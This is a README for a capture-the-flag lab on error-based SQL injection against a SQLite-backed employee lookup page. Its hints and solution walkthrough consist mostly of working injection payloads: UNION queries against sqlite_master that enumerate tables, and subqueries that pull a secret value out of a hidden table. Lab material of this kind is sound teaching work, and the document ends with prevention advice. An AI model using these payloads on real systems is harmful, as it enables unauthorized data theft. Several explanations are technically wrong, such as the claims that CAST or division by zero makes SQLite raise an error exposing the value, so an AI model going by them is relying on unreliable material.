# SQL Injection Lab - Error-Based Injection

## 📚 Description

This lab demonstrates an **Error-Based SQL Injection** vulnerability where sensitive data (the flag) can be leaked through deliberately triggering database error messages. The application uses raw SQL queries with verbose error messages enabled.

**Difficulty Level:** Easy
**Technique:** Error-Based SQL Injection (Database Error Disclosure)

## 🎯 Learning Objectives

After completing this lab, you will understand:

1. How error-based SQL injection works
2. How to leak data through database error messages
3. The dangers of verbose error messages in production
4. Type conversion errors that reveal sensitive data
5. How to properly handle database errors in applications

## 🚀 How to Run

### Using Docker Compose (Recommended)

```bash
docker-compose up -d
docker-compose ps  # Find the assigned port
```

### Using Docker Build

```bash
docker build -t sqli-lab-error .
docker run -d -p 0:80 --name sqli-lab-error sqli-lab-error
docker port sqli-lab-error  # Find the assigned port
```

### Access the Lab

Navigate to: `http://localhost:<random_port>`

## 🎮 Challenge

Your goal is to extract the flag from a **hidden database table** (`__internal_config`) by deliberately causing database errors that leak the sensitive data in the error message.

### What You Know

- The query structure: `SELECT id, name, department, email FROM employees WHERE id = <INPUT>`
- Verbose SQL error messages are enabled
- The flag exists in a hidden table
- You need to leak data through error messages

### Expected Query Structure

```sql
SELECT id, name, department, email FROM employees WHERE id = <user_input>
```

## 💡 Hints

<details>
<summary>Hint 1: Understanding Error-Based Injection</summary>

Error-based injection works by deliberately causing database errors that reveal sensitive information in the error message.
</details>

<details>
<summary>Hint 2: Type Conversion Errors</summary>

In SQLite, you can use `CAST()` to convert between data types. Trying to convert text to a number that contains non-numeric characters will produce an error.
</details>

<details>
<summary>Hint 3: Subquery in Type Conversion</summary>

Try: `CAST((SELECT config_value FROM __internal_config) AS INTEGER)`

This will cause SQLite to throw an error revealing the text value.
</details>

<details>
<summary>Hint 4: Mathematical Operations</summary>

Mathematical operations on text data cause errors. Try:
- Dividing text by a number
- Adding a number to text

Example: `(SELECT config_value FROM __internal_config) / 0`
</details>

<details>
<summary>Hint 5: Duplicate Column Names</summary>

When using UNION, duplicate column names can cause errors:
```sql
1 UNION SELECT 1,2,3,config_value FROM __internal_config
```
</details>

<details>
<summary>Hint 6: Finding Hidden Tables</summary>

Query sqlite_master to discover table names:
```sql
SELECT name FROM sqlite_master WHERE type='table'
```

Inject: `1 AND 1=0 UNION SELECT name,sql,3,4 FROM sqlite_master`
</details>

## 🏁 Success Criteria

You have successfully completed the lab when:

- [ ] You discovered the hidden `__internal_config` table
- [ ] You triggered a database error that leaks the flag
- [ ] The flag (IDS{...}) appears in the error message
- [ ] You understand how error-based injection works

## 🔧 Solution Walkthrough

<details>
<summary>Click to reveal the solution</summary>

### Step 1: Understand the Query

The vulnerable query is:
```sql
SELECT id, name, department, email FROM employees WHERE id = <INPUT>
```

Since `<INPUT>` is not quoted, we can inject SQL directly.

### Step 2: Discover Hidden Tables

First, let's find all tables in the database:

```
id=1 AND 1=0 UNION SELECT name,sql,3,4 FROM sqlite_master WHERE type='table'
```

This reveals:
- `employees`
- `__internal_config` (the hidden flag table!)

### Step 3: Get Table Structure

```
id=1 AND 1=0 UNION SELECT sql,2,3,4 FROM sqlite_master WHERE name='__internal_config'
```

This reveals the table structure:
```sql
CREATE TABLE __internal_config (
    id INTEGER PRIMARY KEY,
    config_key TEXT UNIQUE NOT NULL,
    config_value TEXT NOT NULL
)
```

### Step 4: Extract Flag Using Type Conversion

**Method A: CAST to Integer**

The flag value starts with "IDS{" which is not a valid integer. By trying to CAST it as INTEGER, SQLite will error and reveal the value:

```
id=CAST((SELECT config_value FROM __internal_config WHERE config_key='secret_flag') AS INTEGER)
```

This causes an error like:
```
Error: no such column: IDS{a1b2c3d4...}
```

**Method B: Division by Zero**

```
id=(SELECT config_value FROM __internal_config WHERE config_key='secret_flag') / 0
```

This causes an error revealing the text value.

**Method C: Mathematical Operation**

```
id=(SELECT config_value FROM __internal_config) + 0
```

The `+ 0` attempts to add integer to text, causing an error.

### Working Payloads

**Simplest payload:**
```
id=CAST((SELECT config_value FROM __internal_config WHERE config_key='secret_flag') AS INTEGER)
```

**Alternative:**
```
id=(SELECT config_value FROM __internal_config WHERE config_key='secret_flag') / 1
```

### Why It Works

The query becomes:
```sql
SELECT id, name, department, email FROM employees WHERE id = CAST((SELECT config_value FROM __internal_config WHERE config_key='secret_flag') AS INTEGER)
```

SQLite tries to:
1. Execute the subquery: `SELECT config_value FROM __internal_config WHERE config_key='secret_flag'`
2. This returns: `IDS{a1b2c3d4e5f6...}`
3. CAST tries to convert `IDS{a1b2c3d4e5f6...}` to an INTEGER
4. This fails and produces an error message that includes the problematic value
5. The error message "leaks" the flag!

### Example Error Message

```
Database Error: SQLSTATE[HY000]: General error: 1 no such column: IDS{8f92a3c4b1d2e5f6a7b8c9d0e1f2a3b4}
```

The flag `IDS{8f92a3c4b1d2e5f6a7b8c9d0e1f2a3b4}` is leaked in the error message!

</details>

## 🛡️ Prevention

Error-based SQL injection can be prevented by:

1. **Using Prepared Statements**:
```php
$stmt = $pdo->prepare("SELECT * FROM employees WHERE id = ?");
$stmt->execute([$id]);
```

2. **Disabling Verbose Error Messages** in production:
```php
ini_set('display_errors', 0);
error_log($e->getMessage());  // Log to file, not display
```

3. **Generic Error Messages**:
```php
throw new Exception("Database error occurred. Please try again.");
```

4. **Input Validation** - Ensure ID is numeric before using in query

## 📝 Notes

- This lab is for **educational purposes only**
- The flag is dynamically generated on each container start
- Error messages are intentionally verbose for learning
- No WAF or rate limiting (Easy difficulty)
- Check HTML source for hints!

## 🔗 Resources

- [OWASP Error-Based SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

---

**Author:** IDS – CyberSec Academy Lab Authoring Guideline
**For:** Educational CTF / Internal Lab Training Only
